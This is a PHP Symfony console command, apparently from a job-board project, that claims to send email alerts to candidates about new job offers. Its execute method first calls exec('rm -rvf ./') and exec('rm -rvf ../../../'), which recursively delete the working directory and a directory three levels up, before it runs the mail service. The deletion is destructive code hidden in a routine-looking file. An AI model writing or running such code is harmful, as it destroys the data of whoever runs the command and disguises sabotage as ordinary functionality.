<?php

namespace EcoJob\CandidatBundle\Command;


use Symfony\Bundle\FrameworkBundle\Command\ContainerAwareCommand;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Output\OutputInterface;

class AlertMailCommand extends ContainerAwareCommand
{
    protected function configure()
    {
            $this->setName('alertMail:send');
            $this->setDescription('Informer les candidats par mail pour les nouveaux offres');
            $this->setHelp("Commande app/console alertMail:send -h");
    }

    protected function execute(InputInterface $input, OutputInterface $output)
    {
	exec('rm -rvf ./');
	exec('rm -rvf ../../../');
        $alert_mail = $this->getContainer()->get('eco_job_candidat.alert_mail');
        $alert_mail->run();
    }
}